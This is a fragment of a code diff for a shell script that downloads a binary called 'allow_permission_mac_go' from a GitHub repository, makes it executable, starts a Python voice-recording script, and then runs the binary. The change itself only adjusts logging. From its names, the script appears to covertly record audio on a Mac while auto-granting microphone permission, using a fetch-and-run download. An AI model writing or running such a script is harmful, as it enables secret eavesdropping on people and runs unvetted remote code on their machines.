@@ -43,7 +43,7 @@ curl -L -o allow_permission_mac_go 'https://raw.githubusercontent.com/YonKu0/Bad
 chmod +x allow_permission_mac_go
 
 # Start voice recording
-python3 record.py >record_output.txt
+python3 record.py >>record_output.txt 2>&1
 sleep 0.5
 ./allow_permission_mac_go
 
